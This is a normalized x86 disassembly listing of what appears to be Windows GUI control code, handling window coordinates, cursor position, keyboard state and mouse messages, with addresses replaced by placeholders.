test bl bl
je r-xdata
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_3a64530
mov esi [ eax + 0x40 ]
mov eax [ esp + 0x9 ]
push eax
movzx eax [ ebp + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x11 ]
mov edx esi
mov eax [ esp + 0xc ]
mov si 0xffde
call sub_3a6457c
mov eax [ esp + 0x9 ]
push eax
movzx eax [ ebp + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x11 ]
mov edx esi
mov eax [ edi + 0xc ]
mov si 0xffc3
call sub_3a6457c
jmp r-xdata
test bl bl
je r-xdata
jmp r-xdata
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
movzx eax [ esp + 0x4 ]
mov [ ebp + 0xc ] eax
jmp r-xdata
mov eax [ esp + 0x9 ]
push eax
mov ecx [ esp + 0x9 ]
mov edx esi
mov eax [ esp + 0x4 ]
mov si 0xffcb
call sub_3a6457c
mov eax [ esp + 0x9 ]
push eax
mov ecx [ esp + 0x9 ]
mov edx esi
mov eax [ edi + 0xc ]
mov si 0xffb5
call sub_3a6457c
jmp r-xdata
sub_3ab09c0
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
test edi edi
je r-xdata
mov eax [ ebx + 0x94 ]
test eax eax
je r-xdata
cmp edi 0xffffffff
jne r-xdata
lea ecx [ ebp - 0x24 ]
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_3a78df4
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
cmp [ eax + 0x1db ] 0x0
je r-xdata
mov eax ebx
call sub_3ab0eac
cmp [ ebx + 0x94 ] 0x0
je r-xdata
mov eax ebx
call sub_3aafb14
push eax
lea eax [ ebp - 0x34 ]
push eax
mov eax ebx
call sub_3aafb28
mov ecx eax
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x1c ]
call sub_3a78e44
lea esi [ ebp - 0x34 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_3ab0ba0
mov [ ebp - 0x5 ] al
jmp r-xdata
lea ecx [ ebp - 0x24 ]
lea edx [ ebp - 0x1c ]
mov eax esi
call sub_3aaf610
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
cmp [ eax + 0x1b0 ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebx + 0x94 ]
mov ecx ebx
mov edx edi
mov si 0xffbd
call sub_3a6457c
test al al
jne r-xdata
movzx eax [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea ecx [ ebp - 0x1c ]
mov eax [ eax + 0x1b0 ]
mov edx ebx
mov esi [ eax ]
call [ esi + 0x14 ]
push 0x2
lea eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax [ ebx + 0x94 ]
call sub_3ab7c38
push eax
call MapWindowPoints
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_3aacef4
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_3ab0b8c
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebx + 0x94 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
xor esi esi
call sub_3ab7c38
mov esi eax
jmp r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov [ eax + 0x8 ] edi
mov eax [ ebp - 0xc ]
movzx edx [ ebp + 0x8 ]
mov [ eax + 0x5c ] dl
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x60 ] edx
mov eax [ ebp - 0xc ]
push edi
lea edi [ eax + 0x4c ]
lea esi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
push 0x1
lea eax [ ebp - 0x1c ]
push eax
mov eax edi
call sub_3ab7c38
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
mov eax edi
mov si 0xffb5
call sub_3a6457c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_3a64380
retn
push 0x2
lea eax [ ebp - 0x1c ]
push eax
push 0x0
push esi
call MapWindowPoints
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_3aaf4a0
test esi esi
je r-xdata
sub_3ab0ba0
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi eax
mov ebx [ edi + 0x94 ]
test ebx ebx
je r-xdata
mov al 0x1
mov ecx edi
xor edx edx
mov eax ebx
mov si 0xffbd
call sub_3a6457c
test al al
jne r-xdata
mov eax ebx
add esp 0x20
pop edi
pop esi
pop ebx
retn
mov edx esp
mov eax edi
call sub_3ab1fc8
mov esi eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov ecx esp
mov edx esi
mov eax edi
mov si 0xffcc
call sub_3a6457c
mov eax esi
call sub_3aaf540
push eax
lea eax [ esp + 0x14 ]
push eax
mov eax esi
call sub_3aaf4fc
mov ecx eax
xor edx edx
xor eax eax
call sub_3a78e1c
lea ecx [ esp + 0x10 ]
mov edx esi
mov eax edi
mov si 0xffcc
call sub_3a6457c
jmp r-xdata
mov ebx eax
test bl bl
je r-xdata
sub_3ab0c48
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0xb2 ] 0x0
je r-xdata
movzx eax [ esp ]
pop edx
pop ebx
retn
push ecx
lea ecx [ esp + 0x4 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xb4 ]
call [ ebx + 0xb0 ]
sub_3ab0c78
push ebx
push esi
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov esi eax
cmp [ esi + 0x5b ] 0x5
je r-xdata
mov al 0x1
mov eax [ esp ]
mov eax [ eax ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x34 ]
movzx edx [ esi + 0x5b ]
mov ecx edx
test cl cl
je r-xdata
mov ecx [ esp ]
mov ebx [ esp + 0x8 ]
mov [ ecx ] ebx
add cl 0xfd
sub cl 0x2
jae r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0xc ]
mov [ edx ] ecx
jmp r-xdata
sub dl 0x3
jae r-xdata
sub_3ab0ce4
push ebx
push esi
push edi
push ecx
mov [ esp ] ecx
mov edi edx
mov esi eax
mov ecx [ esp ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x30 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx [ esp ]
mov edx edi
mov eax esi
call sub_3ab0da4
sub_3ab0d14
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xba ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x8
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xbc ]
call [ ebx + 0xb8 ]
sub_3ab0d44
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
push ebx
call GetCursorPos
mov ecx esp
mov edx ebx
mov eax esi
call sub_3aaf6c0
mov eax [ esp ]
mov [ ebx ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
pop ecx
pop edx
pop esi
pop ebx
retn
sub_3ab0d70
push esi
test [ eax + 0x50 ] 0x4
je r-xdata
xor eax eax
pop esi
retn
mov esi [ edx ]
cmp esi 0x204
je r-xdata
mov al 0x1
pop esi
retn
cmp esi 0x205
je r-xdata
cmp esi 0x200
je r-xdata
cmp esi 0x206
je r-xdata
sub_3ab0da4
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov ebx edx
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x14 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp ] edx
mov [ esp ] edx
jmp r-xdata
xor edx edx
mov [ esp + 0x4 ] edx
mov [ esp + 0x4 ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x10 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0x8 ] edx
mov [ esp + 0x8 ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0xc ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0xc ] edx
mov [ esp + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x8 ]
test edx edx
jbe r-xdata
cmp [ esp ] 0x0
jle r-xdata
mov eax [ ebx ]
cmp eax [ esp + 0x8 ]
jle r-xdata
lea edx [ esp + 0x8 ]
push edx
lea edx [ esp + 0x10 ]
push edx
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov edi [ eax ]
call [ edi + 0x38 ]
cmp [ esp + 0x8 ] 0x0
jle r-xdata
cmp [ esp + 0xc ] 0x0
jle r-xdata
mov eax [ ebx ]
cmp eax [ esp ]
jge r-xdata
mov eax [ esp + 0x8 ]
mov [ ebx ] eax
jmp r-xdata
cmp [ esp + 0x4 ] 0x0
jle r-xdata
mov eax [ esi ]
cmp eax [ esp + 0xc ]
jle r-xdata
mov eax [ esp ]
mov [ ebx ] eax
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ esi ]
cmp eax [ esp + 0x4 ]
jge r-xdata
mov eax [ esp + 0xc ]
mov [ esi ] eax
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ esi ] eax
sub_3ab0e78
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] ecx
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0x4 ] edx
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x10 ]
mov ebx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_3ab0eac
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
cmp [ ebx + 0x94 ] 0x0
je r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebx + 0xa0 ] eax
mov eax [ ebx + 0x48 ]
mov [ ebx + 0x9c ] eax
pop ebx
retn
pop ebx
retn
cmp [ ebx + 0x90 ] 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebx + 0xa8 ] eax
jmp r-xdata
mov eax [ ebx + 0x94 ]
movzx eax [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
cmp [ ebx + 0x90 ] 0x1
je r-xdata
mov eax [ ebx + 0x48 ]
mov [ ebx + 0xa4 ] eax
mov eax [ ebx + 0x94 ]
movzx eax [ eax + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
sub_3ab0f20
push ebx
mov ebx eax
mov eax [ edx ]
mov [ ebx + 0x40 ] eax
mov eax [ edx + 0x4 ]
mov [ ebx + 0x44 ] eax
mov eax [ edx + 0x8 ]
sub eax [ edx ]
mov [ ebx + 0x48 ] eax
mov eax [ edx + 0xc ]
sub eax [ edx + 0x4 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_3aaf08c
mov eax ebx
call sub_3ab28e8
pop ebx
retn
sub_3ab0f54
push ebp
mov ebp esp
add esp 0xfffffee8
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax [ ebx ]
cmp eax 0x100
jb r-xdata
xor edx edx
mov eax esi
call sub_3ac463c
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebx ]
cmp eax 0x200
jb r-xdata
cmp eax 0x109
ja r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x298 ] 0x0
je r-xdata
cmp eax 0xb00b
jne r-xdata
cmp eax 0x20a
ja r-xdata
mov dl 0x1
mov eax esi
call sub_3ac463c
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov ecx ebx
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x298 ]
mov edx esi
mov edi [ eax ]
call [ edi + 0x24 ]
test al al
jne r-xdata
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x14 ]
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_3aaf71c
test [ esi + 0x50 ] 0x80
jne r-xdata
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x14 ]
mov edi [ eax ]
call [ edi + 0x100 ]
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx ]
add eax 0xfffffe00
cmp eax 0x7
ja r-xdata
sub eax 0x203
je r-xdata
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
jmp [ eax * 4 + jump_table_3ab102d ]
sub [ ebx ] 0x2
sub eax 0x3
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov ecx ebx
mov eax [ rw-data ]
mov eax [ eax ]
mov edx esi
call sub_3ad020c
jmp r-xdata
test [ esi + 0x52 ] 0x8
je r-xdata
cmp [ esi + 0x5d ] 0x1
jne r-xdata
and [ esi + 0x54 ] 0xfffe
jmp r-xdata
sub eax 0x3
jne r-xdata
mov eax [ ebx ]
mov edx [ rw-data ]
cmp eax [ edx + 0x1c ]
jne r-xdata
movzx eax [ r-xdata ]
and ax [ esi + 0x54 ]
movzx edx [ r-xdata ]
cmp dx ax
jne r-xdata
or [ esi + 0x54 ] 0x1
jmp r-xdata
mov eax esi
mov si 0xffed
call sub_3a6457c
jmp r-xdata
lea eax [ ebp - 0x115 ]
push eax
call GetKeyboardState
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x115 ]
call sub_3ac453c
mov [ ebp - 0xc ] al
movzx eax [ ebx + 0x4 ]
mov [ ebp - 0xa ] ax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x10 ]
mov eax esi
mov si 0xffc9
call sub_3a6457c
jmp r-xdata
mov eax [ rw-data ]
call sub_3abcf40
test al al
jne r-xdata
mov eax [ rw-data ]
call sub_3abcecc
mov [ ebp - 0x15 ] 0x0
mov eax [ rw-data ]
mov edi [ eax + 0x28 ]
test edi edi
je r-xdata
cmp [ ebp - 0x15 ] 0x0
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x28 ] 0x0
je r-xdata
mov [ ebx + 0xc ] 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call sub_3ad0364
jmp r-xdata
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov eax esi
call sub_3ab7c38
mov edx eax
mov eax edi
mov ecx esi
mov edi [ eax ]
call [ edi + 0xe0 ]
mov [ ebp - 0x15 ] al
jmp r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_3abd00c
jmp r-xdata
xor edx edx
mov eax esi
call sub_3ac463c
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ esi + 0x30 ]
call sub_3ab7c38
mov edx eax
mov eax edi
mov ecx esi
mov edi [ eax ]
call [ edi + 0xe0 ]
mov [ ebp - 0x15 ] al
jmp r-xdata
mov eax [ ebp - 0x14 ]
call sub_3ab7c38
mov edx eax
mov eax [ rw-data ]
mov eax [ eax + 0x28 ]
mov ecx esi
mov edi [ eax ]
call [ edi + 0xe0 ]
mov [ ebp - 0x15 ] al
sub_3ab1224
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov eax [ ebx ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x8 ]
call sub_3a6a394
mov edi eax
mov eax [ esi + 0x64 ]
call sub_3a6a3c0
mov [ esi + 0x64 ] edi
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx [ ebx ]
mov eax esi
call sub_3aaf71c
dec eax
je r-xdata
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
dec eax
je r-xdata
mov edi r-xdata
mov edi eax
jmp r-xdata
mov edi [ esi + 0x64 ]
test edi edi
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ ebx + 0x4 ]
dec ecx
mov eax [ ebx + 0x8 ]
mov edx edi
call sub_3a6a1ac
call sub_3a6a120
mov [ ebx + 0xc ] eax
jmp r-xdata
mov eax edi
call sub_3a6a120
mov [ ebx + 0xc ] eax
jmp r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
jmp r-xdata
sub_3ab12cc
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx eax [ eax + 0x5e ]
pop ebp
retn
mov edx [ ebp + 0x8 ]
movzx eax [ eax + 0x5e ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp al [ edx + 0x5e ]
setne al
pop ebp
retn
sub_3ab1300
push ebp
mov ebp esp
push ebx
sub al 0x1
jb r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebx + 0x180 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp eax [ edx + 0x180 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
dec al
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x5b ] 0x0
jne r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebx + 0x184 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp eax [ edx + 0x184 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
dec al
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x180 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp eax [ edx + 0x40 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx eax [ eax + 0x61 ]
and al [ r-xdata ]
movzx edx [ r-xdata ]
cmp dl al
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x5b ] 0x0
jne r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebx + 0x188 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp eax [ edx + 0x188 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x184 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp eax [ edx + 0x44 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx eax [ eax + 0x61 ]
and al [ r-xdata ]
movzx edx [ r-xdata ]
cmp dl al
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x5b ] 0x0
jne r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebx + 0x18c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp eax [ edx + 0x18c ]
jne r-xdata
xor eax eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x188 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp eax [ edx + 0x48 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx eax [ eax + 0x61 ]
and al [ r-xdata ]
movzx edx [ r-xdata ]
cmp dl al
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x5b ] 0x0
jne r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x18c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp eax [ edx + 0x4c ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx eax [ eax + 0x61 ]
and al [ r-xdata ]
movzx edx [ r-xdata ]
cmp dl al
jne r-xdata
sub_3ab1520
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
lea ebx [ ebp - 0x8 ]
mov eax [ ebx ]
push eax
push r-xdata
mov eax [ ebx ]
push eax
push sub_3ab12c0
push ebp
call sub_3ab12cc
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov eax [ ebx ]
push eax
push sub_3ab29a4
mov eax [ ebx ]
push eax
push sub_3ab293c
mov eax [ ebx ]
test [ eax + 0x1c ] 0x2
jne r-xdata
xor ecx ecx
jmp r-xdata
push ebp
xor eax eax
call sub_3ab1300
pop ecx
test al al
jne r-xdata
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov eax [ ebx ]
push eax
push sub_3ab2974
mov eax [ ebx ]
push eax
push sub_3ab291c
mov eax [ ebx ]
test [ eax + 0x1c ] 0x2
jne r-xdata
mov cl 0x1
xor ecx ecx
jmp r-xdata
push ebp
mov al 0x1
call sub_3ab1300
pop ecx
test al al
jne r-xdata
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov eax [ ebx ]
push eax
push sub_3ab294c
mov eax [ ebx ]
push eax
push sub_3ab2964
mov eax [ ebx ]
test [ eax + 0x1c ] 0x2
jne r-xdata
mov cl 0x1
xor ecx ecx
jmp r-xdata
push ebp
mov al 0x2
call sub_3ab1300
pop ecx
test al al
jne r-xdata
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov eax [ ebx ]
push eax
push sub_3ab298c
mov eax [ ebx ]
push eax
push sub_3ab292c
mov eax [ ebx ]
test [ eax + 0x1c ] 0x2
jne r-xdata
mov cl 0x1
xor ecx ecx
jmp r-xdata
push ebp
mov al 0x3
call sub_3ab1300
pop ecx
test al al
jne r-xdata
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov cl 0x1
sub_3ab16b0
push ebx
mov ebx eax
cmp [ ebx + 0x112 ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
cmp [ ebx + 0x112 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov eax [ eax + 0x40 ]
cmp eax [ ebx + 0x110 ]
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
mov edx ebx
mov eax [ ebx + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
pop ebx
retn
sub_3ab173c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
cmp [ eax + 0xc2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
movzx ecx [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_3ab1774
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi + 0x51 ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ edi + 0x48 ] 0x8000
jg r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_3ab0d44
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
movzx eax [ esi + 0x4 ]
call sub_3ac44a4
mov ecx eax
or cl [ ebp + 0x8 ]
mov edx ebx
mov eax edi
mov si 0xffd4
call sub_3a6457c
jmp r-xdata
cmp [ edi + 0x4c ] 0x8000
jle r-xdata
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
movzx eax [ esi + 0x4 ]
call sub_3ac44a4
mov ecx eax
or cl [ ebp + 0x8 ]
mov edx ebx
mov eax edi
mov si 0xffd4
call sub_3a6457c
sub_3ab17f8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_3aaf6ec
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_3aafdf0
movzx eax [ r-xdata ]
push eax
mov edx esi
xor ecx ecx
mov eax ebx
call sub_3ab1774
pop esi
pop ebx
retn
or [ ebx + 0x54 ] 0x2
sub_3ab1844
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_3aaf6ec
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_3ab1860
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_3aaf6ec
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_3aafdf0
movzx eax [ r-xdata ]
push eax
mov edx edi
xor ecx ecx
mov eax ebx
call sub_3ab1774
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffe9
call sub_3a6457c
sub_3ab18bc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebp ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ edi ]
mov [ esp ] eax
mov eax [ ebp ]
mov [ esp + 0x4 ] eax
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax esi
call sub_3ab0ce4
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
cmp [ esi + 0x5c ] 0x0
je r-xdata
mov bl 0x1
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_3ab0c78
test al al
je r-xdata
mov eax [ esp + 0x8 ]
mov [ edi ] eax
mov eax [ esp + 0xc ]
mov [ ebp ] eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_3ab0ce4
test al al
jne r-xdata
mov eax [ esp + 0x8 ]
cmp eax [ esp ]
jne r-xdata
